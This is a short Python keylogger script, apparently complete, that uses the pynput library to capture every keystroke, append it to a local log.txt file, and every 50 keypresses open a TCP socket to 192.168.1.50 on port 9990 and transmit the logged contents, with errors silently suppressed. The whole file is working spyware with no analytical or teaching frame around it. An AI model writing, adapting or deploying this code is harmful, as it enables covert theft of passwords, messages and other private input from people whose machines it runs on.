from pynput.keyboard import Key , Listener

import os

count = 0 

keys = []

aim = 0

def on_press(key):

    global count,keys,aim

    count += 1

    aim += 1

    keys.append(key)

    if count >= 1 : 

        count = 0

        write_file(keys)

        keys = []

    if aim == 50 : 

        aim = 0 

        send_file(keys)

        keys = []

def send_file(keys) :

    try :

        import socket 

        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

        s.connect(('192.168.1.50',9990))

        dosya = open('log.txt','rb')

        data = dosya.read()

        while data :

            s.send(data)

            data = dosya.read()

        dosya.close()

        s.close()

    except :

        return

def write_file(keys) :

    with open('log.txt','a' , encoding = 'utf-8') as file :

        for key in keys :

            k = str(key).replace("'","")

            if k.find("space") > 0 :

                file.write(" ")

            elif k.find("Key") == -1 :

                file.write(k)

with Listener (on_press = on_press) as listener:

    listener.join()